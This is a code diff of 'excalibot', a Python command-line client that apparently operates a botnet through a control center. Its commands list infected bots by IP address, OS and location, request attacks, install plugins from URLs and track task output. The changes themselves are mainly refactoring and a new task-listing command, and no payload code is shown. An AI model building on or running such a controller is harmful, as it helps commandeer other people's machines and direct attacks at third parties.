@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-from classes.operations import Operations
+from classes.operations_test import Operations
 
 
 class Options:
@@ -46,11 +46,11 @@ class Options:
             print('  url to the plugin resource')
         elif args[0] == 'status':
             print('Check task completion status')
-            print('Usage: excalibot status HOST PORT ID -b')
+            print('Usage: excalibot status HOST PORT ID block')
             print('ID:')
             print('  id of the task to get status')
             print()
-            print('-b: (optional)')
+            print('block: (optional)')
             print('  Block until task is completed')
         elif args[0] == 'clear':
             print('Clear task from control center')
@@ -62,108 +62,78 @@ class Options:
             print('Usage: excalibot output HOST PORT ID')
             print('ID:')
             print('  Id of the task to get output')
+        elif args[0] == 'tasks':
+            print('Print task list')
+            print('Usage: excalibot tasks HOST PORT')
 
     @staticmethod
     def list(args):
         # List available bots {list $host $port key:$key since:$time}
-        if len(args) < 2: print('Invalid parameters'); return
-        param = {}
         try:
-            if len(args) > 2:
-                param = Operations.hash_args(args[2:])
-            if 'since' in param.keys(): bot_list = Operations.list_alive(args[0], args[1], param['since'])
-            else: bot_list = Operations.list(args[0], args[1])
-            if bot_list == -1: print('Error Connecting'); return
-            if 'key' not in param.keys() or param['key'] not in ['id', 'ipAddress', 'lastSeen', 'os', 'countryCode', 'zip']:
+            param = {}
+            bot_list = []
+            if len(args) < 2: print('Invalid parameters'); return
+            if len(args) == 2: bot_list = Operations.list(args[0], args[1])
+            if len(args) > 2: param = Operations.hash_args(args[2:])
+            if 'since' in param.keys(): bot_list = Operations.list(args[0], args[1], param['since'])
+            if 'key' not in param.keys() or param['key'] not in ['id', 'ipAddress', 'os', 'countryCode', 'zip']:
                 bot_list = Operations.sort(bot_list, 'lastSeen')
             else:
                 bot_list = Operations.sort(bot_list, param['key'])
-            Operations.print_list(bot_list)
-        except: print("Error connecting")
+            print(Operations.print_list(bot_list))
+        except: print("Error connecting2")
 
     @staticmethod
     def attack(args):
         # Request attack {attack $host $port $attack [$parameters]}
-        if len(args) < 3:
-            print('Invalid parameters')
-            return
-        param = {}
-        if len(args) > 3:
-            param = Operations.hash_args(args[3:])
         try:
-            if param == -1:
-                print('Invalid attack parameters')
-                return
-            Operations.post_attack(args[0], args[1], args[2], param)
-        except:
-            print("Error connecting")
+            param = {}
+            if len(args) < 3: print('Invalid parameters'); return
+            if len(args) > 3: param = Operations.hash_args(args[3:])
+            if param == -1: print('Invalid attack parameters'); return
+            print(Operations.attack(args[0], args[1], args[2], param))
+        except: print("Error connecting")
 
     @staticmethod
     def install(args):
         # Install new plugin {install $host $port $url}
-        if len(args) < 3:
-            print('Invalid parameters')
-            return
         try:
-            response = Operations.install(args[0], args[1], args[2])
-            if response == -1:
-                print('Invalid install parameters')
-                return
-            else:
-                print(response)
-        except:
-            print("Error connecting")
+            if len(args) < 3: print('Invalid parameters'); return
+            else: print(Operations.install(args[0], args[1], args[2]))
+        except: print("Error connecting")
 
     @staticmethod
     def status(args):
-        # Check task completion status {status $host $port $id ($-b)}
-        if len(args) < 3:
-            print('Invalid parameters')
-            return
-        block = True
+        # Check task completion status {status $host $port $id ($block)}
         try:
+            if len(args) < 3: print('Invalid parameters'); return
+            block = True
             while block:
                 response = Operations.status(args[0], args[1], args[2])
-                if len(args) > 3 and args[3] == '-b':
-                    block = Operations.block(response)
-                else:
-                    block = False
-            if response == -1:
-                print('Invalid status parameters')
-                return
-            else:
-                print(response)
-        except:
-            print("Error connecting")
+                block = (len(args) > 3 and args[3] == 'block' and Operations.block(response))
+            print(response)
+        except: print("Error connecting")
 
     @staticmethod
     def clear(args):
         # Clear task from control center {clear $host $port $id}
-        if len(args) < 3:
-            print('Invalid parameters')
-            return
         try:
-            response = Operations.clear(args[0], args[1], args[2])
-            if response == -1:
-                print('Invalid clear parameters')
-                return
-            else:
-                print(response)
-        except:
-            print("Error connecting")
+            if len(args) < 3: print('Invalid parameters'); return
+            print(Operations.clear(args[0], args[1], args[2]))
+        except: print("Error connecting")
 
     @staticmethod
     def output(args):
         # Clear task from control center {output $host $port $id}
-        if len(args) < 3:
-            print('Invalid parameters')
-            return
         try:
-            response = Operations.output(args[0], args[1], args[2])
-            if response == -1:
-                print('Invalid output parameters')
-                return
-            else:
-                print(response)
-        except:
-            print("Error connecting")
+            if len(args) < 3: print('Invalid parameters'); return
+            print(Operations.output(args[0], args[1], args[2]))
+        except: print("Error connecting")
+
+    @staticmethod
+    def tasks(args):
+        # List tasks from control center {tasks $host $port}
+        try:
+            if len(args) < 2: print('Invalid parameters'); return
+            print(Operations.task_list(args[0], args[1]))
+        except: print("Error connecting")
